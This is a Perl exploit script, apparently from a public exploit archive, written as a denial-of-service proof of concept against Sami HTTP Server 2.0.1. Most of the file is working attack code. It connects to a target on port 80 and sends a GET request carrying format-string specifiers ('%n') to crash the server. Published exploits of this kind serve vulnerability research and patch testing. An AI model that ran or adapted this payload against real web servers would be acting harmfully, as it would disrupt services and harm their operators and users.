#!/usr/bin/perl
# Exploit Titel: Sami HTTP Server 2.0.1 GET Request Denial of Service Exploit
# Date: 25.10.10
# Tool: Sami HTTP Server -- Version: 2.0.1 
# Vendor-Website: http://www.karjasoft.com/old.php
# Download Link: http://www.karjasoft.com/files/samihttp/samihttpd_install.exe
# Author: wingthor
# Author-Website (German): http://www.wingthor.de
# Author-Email: exploit@wingthor.de
# Tested on: Windows XP SP3 
# Type: DOS/POC


use IO::Socket;

$target = "127.0.0.1";
$port   = 80;

$payload = "GET /%n%n%n%n%n HTTP/1.1\r\n\r\n";

$sock = IO::Socket::INET->new(Proto=>'tcp', PeerHost=>$target, PeerPort=>$port) or die "Error: $target:$port\n";

$sock->send($payload);

close($sock);